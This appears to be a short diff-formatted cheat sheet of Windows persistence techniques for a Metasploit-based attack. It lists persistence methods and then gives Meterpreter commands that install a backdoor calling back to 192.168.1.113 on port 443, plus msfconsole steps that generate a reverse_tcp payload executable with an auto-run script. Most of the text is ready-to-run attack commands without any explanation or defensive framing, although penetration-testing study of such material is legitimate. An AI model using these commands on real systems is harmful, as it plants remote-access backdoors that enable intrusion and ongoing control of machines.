@@ -1,0 +1,19 @@
+Persistence through the Registry
+Scheduled Backdoors using Scheduled Tasks
+Process Resource Hooking
+Persistence through the MSDTC Service
+WMI Permanent Event Subscriptions
+
+meterpreter > run persistence -h
+meterpreter >run persistence –A –L c:\\ -X 30 –p 443 –r 192.168.1.113
+
+auto run script for persistence
+
+> use payload/meterpreter/reverse_tcp
+> set LHOST ip
+> set LPORT port
+> set AutoRunScript script[opts]
+> generate -t exe -o payload.exe
+
+Seach for Windows/local/registry-persistence
+
